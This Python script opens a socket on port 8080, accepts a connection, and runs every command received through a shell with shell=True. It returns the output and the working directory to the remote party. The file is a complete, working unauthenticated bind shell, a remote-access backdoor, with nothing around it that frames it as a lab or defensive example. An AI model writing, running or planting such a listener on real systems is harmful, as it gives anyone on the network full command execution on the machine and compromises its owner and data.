import socket
import subprocess
import os
import sys

try:
    sock =socket.socket()
except socket.error as err:
    print("This error occured: ",err)
    
try:
    sock.bind(("",8080))
    sock.listen(5)
except socket.error as err:
    print("This error occured: ",err," retrying...")
    sock.bind(("",8080))
    sock.listen(5)
    
conn,address=sock.accept()
print('connection Established for:',address[0]+"port: ",address[1])

while True:
    
    data = conn.recv(1024)
    if(data[:].decode('utf-8')=='quit'):
        print("connection closed..")
        conn.send(str.encode('closed'))
        conn.close()
        sock.close()
        sys.exit()
    if(data[:2].decode('utf-8')=='cd'):
        os.chdir(data[3:].decode('utf-8'))

    
    if len(data)>0:
         cmd=subprocess.Popen(data[:].decode('utf-8'),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
         output = cmd.stdout.read()+cmd.stderr.read()
         outputStr = str(output,'utf-8')
         currentWorkingDirectory = os.getcwd()+'> '

         conn.send(str.encode(outputStr+currentWorkingDirectory))

         print(outputStr)
       
   